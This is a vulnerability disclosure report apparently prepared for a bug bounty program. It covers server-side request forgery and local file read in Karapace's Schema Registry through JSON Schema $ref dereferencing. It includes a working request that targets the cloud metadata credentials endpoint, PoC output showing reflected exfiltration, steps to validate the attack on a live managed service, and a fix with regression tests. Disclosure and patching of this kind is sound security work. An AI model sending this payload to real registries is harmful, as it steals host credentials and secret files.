# Karapace — Server-Side Request Forgery and local file read via JSON Schema `$ref` in Schema Registry compatibility checking

## Classification
- VRT: Server Side Request Forgery (SSRF) -> Internal (high impact). The `file://` scheme additionally yields arbitrary local file read.
- CWE: CWE-918 (Server-Side Request Forgery); CWE-610 (Externally Controlled Reference to a Resource) for the `file://` primitive.
- Suggested severity: P2 (High); P1 (Critical) if the outbound request can reach the host's cloud metadata service (e.g. `169.254.169.254`) and the response can be recovered, yielding host IAM credentials.
- Affected asset: github.com/Aiven-Open/karapace — Schema Registry JSON Schema compatibility engine (`src/karapace/core/compatibility/jsonschema/utils.py`), base commit `b960b4b`. Karapace is Aiven's own project (not a fork), and is the schema registry that backs Aiven for Apache Kafka. Verified at runtime 2026-09-25.

## Summary
Karapace parses attacker-supplied JSON Schemas into a `jsonschema` validator and, during
compatibility checking, "normalizes" them. Normalization walks the schema and, for every `$ref`,
dereferences it through the **legacy** `jsonschema` `RefResolver` (`validator.resolver`). That
resolver dereferences absolute URIs by **fetching** them:

- `http(s)://…` → an outbound HTTP request from the Schema Registry host → **SSRF** (reach
  internal-only services and the cloud metadata endpoint).
- `file://…` → the local file is read → **arbitrary local file read**.

The `$ref` is fully attacker-controlled: it is part of the JSON Schema submitted to the
compatibility endpoint (`POST /compatibility/subjects/{subject}/versions/{version}`, which requires
only `Read`) or to schema registration (`POST /subjects/{subject}/versions`, `Write`). Both run the
same compatibility check under the default `BACKWARD` compatibility once the subject has at least
one version, so any user who can submit a schema can make the Schema Registry issue requests to
arbitrary internal URLs, or read local files, from the registry host.

## Root cause (src/karapace/core, commit b960b4b)
- `compatibility/jsonschema/utils.py` — `normalize_schema_rec` dereferences every `$ref` with the
  legacy resolver:

```python
ref = original_schema.get(Keyword.REF.value)          # utils.py:86  ("$ref", attacker-controlled)
...
if ref is not None:
    resolved_scope, resolved_schema = resolver.resolve(ref)   # utils.py:93  -> fetches http(s)://, reads file://
```

- `utils.py:63-75` `_resolver_of` returns the deprecated `validator.resolver` (a legacy
  `_RefResolver`) and silences the deprecation warning; its `resolve()` performs remote/file
  dereferencing. The module's own TODO ("migrate reference resolution to the `referencing` library")
  shows the unsafe resolver is used knowingly, pending migration.
- `compatibility/jsonschema/checks.py:221-229` `compatibility(reader, writer)` normalizes **both**
  schemas, so the attacker's schema (`writer`) is always dereferenced:

```python
reader_schema = normalize_schema(reader)
writer_schema = normalize_schema(writer)   # writer = attacker-submitted schema
```

- `schema_models.py:52-69` `parse_jsonschema_definition` parses the submitted string with
  `validator_for(...).check_schema(...)`; `check_schema` validates against the meta-schema and does
  **not** reject external `$ref`, so a schema carrying `"$ref": "http://…"` / `"file://…"` parses
  fine and reaches normalization.
- Reachability (default config, `BACKWARD` compatibility):
  - Endpoint `POST /compatibility/subjects/{subject}/versions/{version}` — `api/routers/compatibility.py:39`
    gates on `Operation.Read`; `controller.py:142-150` parses the submitted schema and calls the
    compatibility check that normalizes it.
  - Registration `POST /subjects/{subject}/versions` — on a subject with an existing version,
    `schema_registry.py:387` `check_schema_compatibility(new_schema, subject)` runs the same path.
  - `compatibility/schema_compatibility.py:74-88` — the JSONSCHEMA branch feeds `new_schema` (the
    attacker's validator) into normalization; `NONE` mode returns earlier, but the default is not `NONE`.

## Steps to reproduce (runtime, verified)
Verified against the real `parse_jsonschema_definition` + `normalize_schema` (the exact functions the
compatibility path invokes). The outbound HTTP request and the local file read both occur.

Preconditions: a subject with at least one version and default (`BACKWARD`) compatibility; `Read` on
that subject for the compatibility endpoint (or `Write` to register a new version). A user can create
their own subject and register a first, benign version to satisfy this.

1. Submit a JSON Schema whose `$ref` targets an internal URL (here, a stand-in listener; in a real
   deployment, the cloud metadata service or an internal API):

```http
POST /compatibility/subjects/<own-subject>/versions/1
Content-Type: application/vnd.schemaregistry.v1+json

{"schemaType":"JSON","schema":"{\"type\":\"object\",\"properties\":{\"x\":{\"$ref\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}}}"}
```

2. The Schema Registry host issues a GET to that URL while normalizing the schema. Swap the scheme to
   `file:///…` to read a local file instead of making a network request.

## Proof (real PoC output; see poc/karapace_jsonschema_ssrf_poc.py)

```text
== Local file read (file://) ==
[file://] attacker schema $ref ->  file:///tmp/tmpw3l_lisb.json
[file://] normalized schema     ->  {"type": "object", "properties": {"x": {"stolen_secret": "CANARY_local_file_read_proof"}}}
[file://] local file content read: True

== SSRF (http://) ==
[http://] attacker schema $ref ->  http://127.0.0.1:43997/latest/meta-data/iam/security-credentials/
[http://] requests received by the internal service: ['/latest/meta-data/iam/security-credentials']

RESULT: VULNERABLE — JSON Schema $ref is dereferenced by the Schema Registry
        (local file read: True, outbound SSRF: True).
```

The `file://` fetch reads a local file and the content is inlined into the normalized schema; the
`http://` fetch reaches an attacker-chosen URL from the registry process.

The fetched content is also **returned to the caller**, so this is a *reflected* (not blind) SSRF /
file read. When the caller's existing version uses an `enum` and the malicious version places the
`$ref` at that location, the compatibility check inlines the fetched document and echoes its values
in the response `messages`:

```text
== Reflected exfiltration via the compatibility API response ==
[exfil]  compatibility response messages: {'some of enum options are no longer valid CANARY_EXFIL_local_secret_value'}
[exfil]  fetched content returned to caller via API response: True
```

That is, the content of a local file (or an internal HTTP response) is delivered verbatim in the body
of `POST /compatibility/subjects/{subject}/versions/{version}` — an `is_compatible:false` response
whose `messages` carry the stolen data straight back to the low-privileged caller.

## Impact
Any user who can submit a JSON Schema to a compatibility check or registration makes the Schema
Registry host perform attacker-directed requests:
- **SSRF** to internal-only services and the cloud metadata endpoint. On a managed deployment the
  metadata service commonly exposes the host's IAM credentials, so a reachable + recoverable metadata
  response is a path to host-credential theft and lateral movement into the orchestration plane.
- **Arbitrary local file read** via `file://` (Kafka/TLS credential files, config with secrets, etc.).

This is a **reflected** SSRF / file read, not blind: as shown above, the fetched document's content
is returned to the caller in the compatibility response `messages` (via the `enum` comparison path),
so an internal HTTP response or a local JSON file is exfiltrated directly through the API. The
outbound request / file read itself is unconditional. Reachable by a low-privilege user (`Read` on one
subject; free trial accounts suffice); no admin role required. Local file read via `file://` is
independent of any network egress policy, so credential/config files that happen to be JSON (service
account keys, container/registry configs, mounted secrets) are readable even where outbound SSRF is
filtered.

## Remediation
Do not dereference external `$ref` schemes on untrusted schemas. Concretely:
- Complete the migration noted in `utils.py` to the `referencing` library and resolve refs with **no
  network/file retrieval** (its default), so only in-document (`#/…`) refs resolve.
- Until then, before/inside `normalize_schema_rec`, reject any `$ref` whose scheme is not empty or a
  local JSON pointer — explicitly block `http`, `https`, `file`, `ftp`, etc. — and/or construct the
  resolver with a `handlers` map / `resolve_remote=False`-equivalent that refuses remote resolution.
- Reject non-local `$ref` at parse time in `parse_jsonschema_definition` as defense in depth.

A fix is implemented in commit history on branch `claude/tender-heisenberg-cooy3y`: `_resolver_of`
(`compatibility/jsonschema/utils.py`) now replaces the resolver's `resolve_remote` with a function
that raises, so `resolve()` still serves in-document (`#/…`) references from its store but any
attempt to fetch an external document (`http(s)://`, `file://`, or a nested external `$id` scope) is
refused. Regression tests (`tests/unit/compatibility/jsonschema/test_ref_ssrf.py`) assert that a
`file://` ref is not read, an `http://` ref triggers no outbound request, and in-document refs still
normalize; `poc/karapace_jsonschema_ssrf_poc.py` reports `SAFE` against the fixed code and
`VULNERABLE` against `b960b4b`.

## Reproduce
Linux, Python 3.11+, a Karapace checkout. Install the pure-Python deps needed to import the
compatibility/normalization code (the PoC stubs the native protopace/otel modules it does not use),
then run:

```bash
pip install jsonschema avro pydantic pydantic-settings typing_extensions networkx

# Drives the real parse_jsonschema_definition + normalize_schema (+ compatibility() for the
# reflected-exfiltration demo); RESULT: VULNERABLE (exit 1) on b960b4b, SAFE (exit 0) once fixed.
PYTHONPATH=src python3 poc/karapace_jsonschema_ssrf_poc.py
```

Note for the Aiven bug bounty: the code-level PoC above proves the primitive; the program requires a
proof of concept on the Aiven resource. Validate by creating an Aiven for Apache Kafka service with
Karapace schema registry, registering a first (benign) schema version whose `x` property is an `enum`
to your own subject, then submitting to `POST /compatibility/subjects/<subject>/versions/1` a JSON
Schema that replaces `x` with `{"$ref":"http://169.254.169.254/…"}` (or `file:///…`) and reading the
fetched content back out of the `messages` in the response body.

## Anticipated triager objections and rebuttals
- **"Theoretical / no PoC on an Aiven asset."** The PoC drives the exact functions on Aiven's own
  code and reflects fetched content back to the caller. Per the *Aiven Open Source Repositories*
  scope, a vulnerability in Aiven open-source code is in scope; the code is present verbatim in
  upstream `Aiven-Open/karapace` at HEAD `b960b4b` (see `poc_output_UPSTREAM_vulnerable.txt`). To also
  claim the managed-service tier, run the same request against an Aiven for Apache Kafka schema
  registry (steps above).
- **"It's a `jsonschema` (third-party) bug."** No — the flaw is Karapace's code deliberately calling
  `resolver.resolve()` on an attacker-controlled `$ref` during normalization, and explicitly using the
  deprecated `validator.resolver` (with a standing TODO). SSRF via passing untrusted input to a
  fetching sink is attributed to the application, not the library, exactly as XXE is attributed to the
  app, not the XML parser.
- **"Blind SSRF / low impact."** Not blind: the fetched document's content is returned in the
  compatibility response `messages` (demonstrated above), so internal HTTP responses and local JSON
  files are exfiltrated directly.
- **"Needs a special/non-default configuration."** No — default compatibility is `BACKWARD`
  (`config.py:101`), and the compatibility check normalizes the submitted (attacker) schema on any
  subject that has ≥1 version. The attacker creates their own subject and registers one benign version
  first; only `Read` on that subject is needed for the compatibility endpoint.
- **"Only affects old Draft-7."** The same normalization/resolver path runs for Draft 2019-09 and
  2020-12 (`$schema` selected by the submitter); the resolver is legacy in every case.
- **"Parsing rejects external `$ref`."** It does not: `parse_jsonschema_definition` only runs
  `check_schema` (meta-schema validation), which accepts `"$ref":"http://…"`/`"file://…"` — verified
  by the PoC parsing it successfully.
- **"Metadata uses IMDSv2 / egress is filtered."** The `file://` local file read needs no network and
  is unaffected by egress policy; the SSRF additionally reaches internal services beyond the metadata
  endpoint. Impact does not rest on IMDSv1.
- **"Already reported / fixed."** No mitigation exists in upstream (`resolve_remote` is never
  restricted; no `$ref`-scheme check anywhere), so it is not fixed in code. (The reporter should still
  confirm no prior Bugcrowd submission / GHSA covers it.)
